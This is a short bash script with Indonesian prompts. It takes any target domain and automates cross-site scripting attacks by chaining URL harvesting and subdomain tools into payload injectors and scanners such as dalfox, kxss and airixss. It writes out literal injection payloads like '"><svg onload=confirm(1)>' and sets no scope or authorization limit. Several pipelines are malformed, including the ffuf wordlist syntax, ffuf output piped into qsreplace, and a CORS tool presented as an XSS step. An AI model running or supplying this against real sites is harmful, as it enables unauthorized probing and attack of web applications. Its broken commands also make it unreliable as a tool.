#!/bin/bash


echo "Masukkan domain atau URL target (misal: example.com atau http://example.com):"
read domain

if [ -z "$domain" ]; then
    echo "Domain atau URL tidak boleh kosong!"
    exit 1
fi

echo "Scanning domain: $domain"

echo "Running: waybackurls | gf | httpx | qsreplace | dalfox"
echo "$domain" | waybackurls | gf xss | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe -b $domain

echo "Running: ffuf | qsreplace | dalfox"
ffuf -u "http://$domain?param=FUZZ" -w ~/Documents/xss-payload.txt | qsreplace 'FUZZ' | dalfox pipe

echo "Running: gau | httpx | kxss"
gau $domain | httpx -silent | kxss

echo "Running: ffuf directories and parameters | airixss"
ffuf -u "http://$domain/FUZZ?param=FUZZ" -w directories.txt:xss-payloads.txt | qsreplace 'FUZZ' | airixss -payload '"><svg onload=confirm(1)>'

echo "Running: subfinder | httprobe | dalfox"
subfinder -d $domain | httprobe | dalfox pipe

echo "Running: gau | gf | qsreplace | dalfox"
gau $domain | gf xss | qsreplace '"><svg onload=alert(1)>' | dalfox pipe

echo "Running: waybackurls | gf | arjun | qsreplace | dalfox"
echo $domain | waybackurls | gf xss | qsreplace '"><svg onload=alert(1)>' | dalfox pipe

echo "Running: ffuf | qsreplace | kxss"
ffuf -u "http://$domain/page.php?FUZZ=1" -w parameters.txt | qsreplace '"><img src=x onerror=alert(1)>' | kxss

echo "Running: ffuf | qsreplace | dalfox | airixss"
ffuf -u "http://$domain?param=FUZZ" -w ~/Documents/xss-payload.txt | qsreplace 'FUZZ' | dalfox pipe && airixss -payload '"><svg onload=confirm(1)>'

echo "Running: waybackurls | gf | corsy"
echo $domain | waybackurls | gf xss | corsy

echo "XSS scanning completed."
